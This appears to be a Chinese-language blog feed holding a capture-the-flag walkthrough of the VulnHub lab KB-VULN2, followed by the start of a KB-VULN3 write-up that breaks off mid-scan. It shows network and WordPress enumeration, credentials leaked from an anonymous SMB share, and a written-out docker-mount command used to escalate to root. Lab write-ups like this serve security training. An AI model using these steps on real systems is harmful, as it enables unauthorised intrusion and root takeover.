    <content><![CDATA[<h1 id="KB-VULN2"><a href="#KB-VULN2" class="headerlink" title="KB-VULN2"></a>KB-VULN2</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>KB-VULN2</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi/vulnhub/KB-VULN2]</span><br><span class="line">└─# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:e1:47:5f, IPv4: 192.168.4.163</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.4.1	20:76:93:42:85:21	Lenovo (Beijing) Limited.</span><br><span class="line">192.168.4.3	20:0d:b0:31:ce:db	Shenzhen Four Seas Global Link Network Technology Co., Ltd.</span><br><span class="line">192.168.4.57	08:00:27:2c:f0:c9	PCS Systemtechnik GmbH</span><br><span class="line">192.168.4.219	d0:c6:37:be:7e:b3	Intel Corporate</span><br><span class="line">192.168.4.129	b0:f8:93:24:54:f1	Shanghai MXCHIP Information Technology Co., Ltd.</span><br><span class="line"></span><br><span class="line">5 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.971 seconds (129.88 hosts/sec). 5 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.4.57</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV -p- 192.168.4.57</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi/vulnhub/KB-VULN2]</span><br><span class="line">└─# nmap -sC -sV -p- 192.168.4.57</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-07 05:30 EDT</span><br><span class="line">Nmap scan report for kb-server.lan (192.168.4.57)</span><br><span class="line">Host is up (0.00044s latency).</span><br><span class="line">Not shown: 65530 closed ports</span><br><span class="line">PORT    STATE SERVICE     VERSION</span><br><span class="line">21/tcp  open  ftp         vsftpd 3.0.3</span><br><span class="line">22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 5e:99:01:23:fe:c4:84:ef:14:55:87:da:a3:30:6f:50 (RSA)</span><br><span class="line">|   256 cb:8e:e1:b3:3a:6e:64:9e:0f:53:39:7e:18:9d:8b:3f (ECDSA)</span><br><span class="line">|_  256 ec:3b:d9:53:4a:5a:f7:32:f2:3a:f7:a7:6f:31:87:52 (ED25519)</span><br><span class="line">80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)</span><br><span class="line">MAC Address: 08:00:27:2C:F0:C9 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Service Info: Host: UBUNTU; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_nbstat: NetBIOS name: UBUNTU, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)</span><br><span class="line">|   Computer name: kb-server</span><br><span class="line">|   NetBIOS computer name: UBUNTU\x00</span><br><span class="line">|   Domain name: \x00</span><br><span class="line">|   FQDN: kb-server</span><br><span class="line">|_  System time: 2021-05-07T09:30:20+00:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2021-05-07T09:30:20</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 15.16 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<p><img data-src="./KB-VULN2/1.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.4.57/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">└─# gobuster dir -u http://192.168.4.57/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.4.57/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              html,txt,php</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/05/07 05:30:25 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/index.html           (Status: 200) [Size: 10918]</span><br><span class="line">/wordpress            (Status: 301) [Size: 316] [--&gt; http://192.168.4.57/wordpress/]</span><br><span class="line">/server-status        (Status: 403) [Size: 277]                                     </span><br><span class="line">                                                                                    </span><br><span class="line">===============================================================</span><br><span class="line">2021/05/07 05:34:53 Finished</span><br><span class="line">===============================================================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gobuster dir -u http://192.168.4.57/wordpress -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">                                                                                                                                                                                                                    </span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi]</span><br><span class="line">└─# gobuster dir -u http://192.168.4.57/wordpress -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.4.57/wordpress</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              html,txt,php</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/05/07 05:35:30 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/uploads              (Status: 301) [Size: 324] [--&gt; http://192.168.4.57/wordpress/uploads/]</span><br><span class="line">/wp-content           (Status: 301) [Size: 327] [--&gt; http://192.168.4.57/wordpress/wp-content/]</span><br><span class="line">/index.php            (Status: 301) [Size: 0] [--&gt; http://192.168.4.57/wordpress/]             </span><br><span class="line">/license.txt          (Status: 200) [Size: 19915]                                              </span><br><span class="line">/wp-includes          (Status: 301) [Size: 328] [--&gt; http://192.168.4.57/wordpress/wp-includes/]</span><br><span class="line">/wp-login.php         (Status: 200) [Size: 6773]                                                </span><br><span class="line">/readme.html          (Status: 200) [Size: 7278]                                                </span><br><span class="line">/wp-trackback.php     (Status: 200) [Size: 135]                                                 </span><br><span class="line">/wp-admin             (Status: 301) [Size: 325] [--&gt; http://192.168.4.57/wordpress/wp-admin/]   </span><br><span class="line">/xmlrpc.php           (Status: 405) [Size: 42]                                                  </span><br><span class="line">/wp-signup.php        (Status: 302) [Size: 0] [--&gt; http://kb.vuln/wordpress/wp-login.php?action=register]</span><br><span class="line">                                                                                                         </span><br><span class="line">===============================================================</span><br><span class="line">2021/05/07 05:40:43 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>



<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li>首页</li>
</ul>
<p><img data-src="./KB-VULN2/2.png" alt></p>
<h3 id="wordpress"><a href="#wordpress" class="headerlink" title="wordpress"></a>wordpress</h3><ul>
<li>发现<code>wordpress</code></li>
</ul>
<p><img data-src="./KB-VULN2/3.png" alt></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wpscan --url http:&#x2F;&#x2F;192.168.4.57&#x2F;wordpress&#x2F;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">┌──(root💀weiyi)-[&#x2F;home&#x2F;weiyi]</span><br><span class="line">└─# wpscan --url http:&#x2F;&#x2F;192.168.4.57&#x2F;wordpress&#x2F;</span><br><span class="line"></span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        &#x2F; &#x2F;  __ \ &#x2F; ____|</span><br><span class="line">          \ \  &#x2F;\  &#x2F; &#x2F;| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \&#x2F;  \&#x2F; &#x2F; |  ___&#x2F; \___ \ &#x2F; __|&#x2F; _&#96; | &#39;_ \</span><br><span class="line">            \  &#x2F;\  &#x2F;  | |     ____) | (__| (_| | | | |</span><br><span class="line">             \&#x2F;  \&#x2F;   |_|    |_____&#x2F; \___|\__,_|_| |_|</span><br><span class="line"></span><br><span class="line">         WordPress Security Scanner by the WPScan Team</span><br><span class="line">                         Version 3.8.17</span><br><span class="line">                               </span><br><span class="line">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span><br><span class="line">_______________________________________________________________</span><br><span class="line"></span><br><span class="line">[i] Updating the Database ...</span><br><span class="line">[i] Update completed.</span><br><span class="line"></span><br><span class="line">[+] URL: http:&#x2F;&#x2F;192.168.4.57&#x2F;wordpress&#x2F; [192.168.4.57]</span><br><span class="line">[+] Started: Fri May  7 05:36:55 2021</span><br><span class="line"></span><br><span class="line">Interesting Finding(s):</span><br><span class="line"></span><br><span class="line">[+] Headers</span><br><span class="line"> | Interesting Entry: Server: Apache&#x2F;2.4.29 (Ubuntu)</span><br><span class="line"> | Found By: Headers (Passive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] XML-RPC seems to be enabled: http:&#x2F;&#x2F;192.168.4.57&#x2F;wordpress&#x2F;xmlrpc.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"> | References:</span><br><span class="line"> |  - http:&#x2F;&#x2F;codex.wordpress.org&#x2F;XML-RPC_Pingback_API</span><br><span class="line"> |  - https:&#x2F;&#x2F;www.rapid7.com&#x2F;db&#x2F;modules&#x2F;auxiliary&#x2F;scanner&#x2F;http&#x2F;wordpress_ghost_scanner&#x2F;</span><br><span class="line"> |  - https:&#x2F;&#x2F;www.rapid7.com&#x2F;db&#x2F;modules&#x2F;auxiliary&#x2F;dos&#x2F;http&#x2F;wordpress_xmlrpc_dos&#x2F;</span><br><span class="line"> |  - https:&#x2F;&#x2F;www.rapid7.com&#x2F;db&#x2F;modules&#x2F;auxiliary&#x2F;scanner&#x2F;http&#x2F;wordpress_xmlrpc_login&#x2F;</span><br><span class="line"> |  - https:&#x2F;&#x2F;www.rapid7.com&#x2F;db&#x2F;modules&#x2F;auxiliary&#x2F;scanner&#x2F;http&#x2F;wordpress_pingback_access&#x2F;</span><br><span class="line"></span><br><span class="line">[+] WordPress readme found: http:&#x2F;&#x2F;192.168.4.57&#x2F;wordpress&#x2F;readme.html</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] Upload directory has listing enabled: http:&#x2F;&#x2F;192.168.4.57&#x2F;wordpress&#x2F;wp-content&#x2F;uploads&#x2F;</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] The external WP-Cron seems to be enabled: http:&#x2F;&#x2F;192.168.4.57&#x2F;wordpress&#x2F;wp-cron.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 60%</span><br><span class="line"> | References:</span><br><span class="line"> |  - https:&#x2F;&#x2F;www.iplocation.net&#x2F;defend-wordpress-from-ddos</span><br><span class="line"> |  - https:&#x2F;&#x2F;github.com&#x2F;wpscanteam&#x2F;wpscan&#x2F;issues&#x2F;1299</span><br><span class="line"></span><br><span class="line">[+] WordPress version 5.5.1 identified (Insecure, released on 2020-09-01).</span><br><span class="line"> | Found By: Emoji Settings (Passive Detection)</span><br><span class="line"> |  - http:&#x2F;&#x2F;192.168.4.57&#x2F;wordpress&#x2F;, Match: &#39;wp-includes\&#x2F;js\&#x2F;wp-emoji-release.min.js?ver&#x3D;5.5.1&#39;</span><br><span class="line"> | Confirmed By: Meta Generator (Passive Detection)</span><br><span class="line"> |  - http:&#x2F;&#x2F;192.168.4.57&#x2F;wordpress&#x2F;, Match: &#39;WordPress 5.5.1&#39;</span><br><span class="line"></span><br><span class="line">[i] The main theme could not be detected.</span><br><span class="line"></span><br><span class="line">[+] Enumerating All Plugins (via Passive Methods)</span><br><span class="line"></span><br><span class="line">[i] No plugins Found.</span><br><span class="line"></span><br><span class="line">[+] Enumerating Config Backups (via Passive and Aggressive Methods)</span><br><span class="line"> Checking Config Backups - Time: 00:00:00 &lt;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt; (137 &#x2F; 137) 100.00% Time: 00:00:00</span><br><span class="line"></span><br><span class="line">[i] No Config Backups Found.</span><br><span class="line"></span><br><span class="line">[!] No WPScan API Token given, as a result vulnerability data has not been output.</span><br><span class="line">[!] You can get a free API token with 25 daily requests by registering at https:&#x2F;&#x2F;wpscan.com&#x2F;register</span><br><span class="line"></span><br><span class="line">[+] Finished: Fri May  7 05:37:01 2021</span><br><span class="line">[+] Requests Done: 180</span><br><span class="line">[+] Cached Requests: 4</span><br><span class="line">[+] Data Sent: 46.277 KB</span><br><span class="line">[+] Data Received: 16.518 MB</span><br><span class="line">[+] Memory used: 194.703 MB</span><br><span class="line">[+] Elapsed time: 00:00:06</span><br><span class="line"></span><br><span class="line">wpscan --url http:&#x2F;&#x2F;192.168.4.57&#x2F;wordpress&#x2F; --enumerate u</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">(root💀weiyi)-[&#x2F;home&#x2F;weiyi]</span><br><span class="line">└─# wpscan --url http:&#x2F;&#x2F;192.168.4.57&#x2F;wordpress&#x2F; --enumerate u</span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        &#x2F; &#x2F;  __ \ &#x2F; ____|</span><br><span class="line">          \ \  &#x2F;\  &#x2F; &#x2F;| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \&#x2F;  \&#x2F; &#x2F; |  ___&#x2F; \___ \ &#x2F; __|&#x2F; _&#96; | &#39;_ \</span><br><span class="line">            \  &#x2F;\  &#x2F;  | |     ____) | (__| (_| | | | |</span><br><span class="line">             \&#x2F;  \&#x2F;   |_|    |_____&#x2F; \___|\__,_|_| |_|</span><br><span class="line"></span><br><span class="line">         WordPress Security Scanner by the WPScan Team</span><br><span class="line">                         Version 3.8.17</span><br><span class="line">       Sponsored by Automattic - https:&#x2F;&#x2F;automattic.com&#x2F;</span><br><span class="line">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span><br><span class="line">_______________________________________________________________</span><br><span class="line"></span><br><span class="line">[+] URL: http:&#x2F;&#x2F;192.168.4.57&#x2F;wordpress&#x2F; [192.168.4.57]</span><br><span class="line">[+] Started: Fri May  7 05:40:02 2021</span><br><span class="line"></span><br><span class="line">Interesting Finding(s):</span><br><span class="line"></span><br><span class="line">[+] Headers</span><br><span class="line"> | Interesting Entry: Server: Apache&#x2F;2.4.29 (Ubuntu)</span><br><span class="line"> | Found By: Headers (Passive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] XML-RPC seems to be enabled: http:&#x2F;&#x2F;192.168.4.57&#x2F;wordpress&#x2F;xmlrpc.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"> | References:</span><br><span class="line"> |  - http:&#x2F;&#x2F;codex.wordpress.org&#x2F;XML-RPC_Pingback_API</span><br><span class="line"> |  - https:&#x2F;&#x2F;www.rapid7.com&#x2F;db&#x2F;modules&#x2F;auxiliary&#x2F;scanner&#x2F;http&#x2F;wordpress_ghost_scanner&#x2F;</span><br><span class="line"> |  - https:&#x2F;&#x2F;www.rapid7.com&#x2F;db&#x2F;modules&#x2F;auxiliary&#x2F;dos&#x2F;http&#x2F;wordpress_xmlrpc_dos&#x2F;</span><br><span class="line"> |  - https:&#x2F;&#x2F;www.rapid7.com&#x2F;db&#x2F;modules&#x2F;auxiliary&#x2F;scanner&#x2F;http&#x2F;wordpress_xmlrpc_login&#x2F;</span><br><span class="line"> |  - https:&#x2F;&#x2F;www.rapid7.com&#x2F;db&#x2F;modules&#x2F;auxiliary&#x2F;scanner&#x2F;http&#x2F;wordpress_pingback_access&#x2F;</span><br><span class="line"></span><br><span class="line">[+] WordPress readme found: http:&#x2F;&#x2F;192.168.4.57&#x2F;wordpress&#x2F;readme.html</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] Upload directory has listing enabled: http:&#x2F;&#x2F;192.168.4.57&#x2F;wordpress&#x2F;wp-content&#x2F;uploads&#x2F;</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] The external WP-Cron seems to be enabled: http:&#x2F;&#x2F;192.168.4.57&#x2F;wordpress&#x2F;wp-cron.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 60%</span><br><span class="line"> | References:</span><br><span class="line"> |  - https:&#x2F;&#x2F;www.iplocation.net&#x2F;defend-wordpress-from-ddos</span><br><span class="line"> |  - https:&#x2F;&#x2F;github.com&#x2F;wpscanteam&#x2F;wpscan&#x2F;issues&#x2F;1299</span><br><span class="line"></span><br><span class="line">[+] WordPress version 5.5.1 identified (Insecure, released on 2020-09-01).</span><br><span class="line"> | Found By: Emoji Settings (Passive Detection)</span><br><span class="line"> |  - http:&#x2F;&#x2F;192.168.4.57&#x2F;wordpress&#x2F;, Match: &#39;wp-includes\&#x2F;js\&#x2F;wp-emoji-release.min.js?ver&#x3D;5.5.1&#39;</span><br><span class="line"> | Confirmed By: Meta Generator (Passive Detection)</span><br><span class="line"> |  - http:&#x2F;&#x2F;192.168.4.57&#x2F;wordpress&#x2F;, Match: &#39;WordPress 5.5.1&#39;</span><br><span class="line"></span><br><span class="line">[i] The main theme could not be detected.</span><br><span class="line"></span><br><span class="line">[+] Enumerating Users (via Passive and Aggressive Methods)</span><br><span class="line"> Brute Forcing Author IDs - Time: 00:00:02 &lt;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt; (10 &#x2F; 10) 100.00% Time: 00:00:02</span><br><span class="line"></span><br><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] admin</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[!] No WPScan API Token given, as a result vulnerability data has not been output.</span><br><span class="line">[!] You can get a free API token with 25 daily requests by registering at https:&#x2F;&#x2F;wpscan.com&#x2F;register</span><br><span class="line"></span><br><span class="line">[+] Finished: Fri May  7 05:40:07 2021</span><br><span class="line">[+] Requests Done: 23</span><br><span class="line">[+] Cached Requests: 28</span><br><span class="line">[+] Data Sent: 6.299 KB</span><br><span class="line">[+] Data Received: 40.77 KB</span><br><span class="line">[+] Memory used: 127.297 MB</span><br><span class="line">[+] Elapsed time: 00:00:04</span><br></pre></td></tr></table></figure>

<h3 id="samba"><a href="#samba" class="headerlink" title="samba"></a>samba</h3><ul>
<li>发现敏感信息</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">smbclient //192.168.4.57/Anonymous</span><br></pre></td></tr></table></figure>

<p><img data-src="./KB-VULN2/4.png" alt></p>
<p><img data-src="./KB-VULN2/5.png" alt></p>
<p>发现账号密码<code>admin / MachineBoy141</code></p>
<ul>
<li>进入<code>wordpress</code>后台</li>
</ul>
<p><img data-src="./KB-VULN2/6.png" alt></p>
<ul>
<li>写入命令</li>
</ul>
<p><img data-src="./KB-VULN2/7.png" alt></p>
<p><img data-src="./KB-VULN2/8.png" alt></p>
<h3 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h3><p><img data-src="./KB-VULN2/9.png" alt></p>
<p><img data-src="./KB-VULN2/10.png" alt></p>
<ul>
<li>提醒利用<code>docker</code></li>
</ul>
<p><img data-src="./KB-VULN2/11.png" alt></p>
<ul>
<li>尝试用<code>MachineBoy141</code> 密码登录成功</li>
</ul>
<p><img data-src="./KB-VULN2/12.png" alt></p>
<h3 id="提权-amp-amp-Flag"><a href="#提权-amp-amp-Flag" class="headerlink" title="提权&amp;&amp;Flag"></a>提权&amp;&amp;Flag</h3><p><img data-src="./KB-VULN2/13.png" alt></p>
<p><img data-src="./KB-VULN2/14.png" alt></p>
<ul>
<li>貌似不是官方预定解 （其实crontab也可以suid提权）</li>
</ul>
<p>用<code>docker</code>提权</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh</span><br><span class="line">sudo docker run -it -v /:/mnt ubuntu</span><br></pre></td></tr></table></figure>

<p><img data-src="./KB-VULN2/15.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>KB-VULN</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
        <tag>KB-VULN</tag>
      </tags>
  </entry>
  <entry>
    <title>KB-VULN3</title>
    <url>/2021/05/08/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/KB-VULN3/</url>
    <content><![CDATA[<h1 id="KB-VULN3"><a href="#KB-VULN3" class="headerlink" title="KB-VULN3"></a>KB-VULN3</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>KB-VULN3</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi/vulnhub/KB-VULN3]</span><br><span class="line">└─# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:e1:47:5f, IPv4: 192.168.4.163</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.4.1	20:76:93:42:85:21	Lenovo (Beijing) Limited.</span><br><span class="line">192.168.4.3	20:0d:b0:31:ce:db	Shenzhen Four Seas Global Link Network Technology Co., Ltd.</span><br><span class="line">192.168.4.129	b0:f8:93:24:54:f1	Shanghai MXCHIP Information Technology Co., Ltd.</span><br><span class="line">192.168.4.158	08:00:27:93:80:7f	PCS Systemtechnik GmbH</span><br><span class="line">192.168.4.219	d0:c6:37:be:7e:b3	Intel Corporate</span><br><span class="line"></span><br><span class="line">5 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.968 seconds (130.08 hosts/sec). 5 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.4.158</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV -p- 192.168.4.158</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi/vulnhub]</span><br><span class="line">└─# nmap -sC -sV -p- 192.168.4.158</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-07 08:57 EDT</span><br><span class="line">Nmap scan report for kb-server.lan (192.168.4.158)</span><br><span class="line">Host is up (0.00039s latency).</span><br><span class="line">Not shown: 65531 closed ports</span><br><span class="line">PORT    STATE SERVICE     VERSION</span><br><span class="line">22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 cb:04:f0:36:3f:42:f7:3a:ce:2f:f5:4c:e0:ab:fe:17 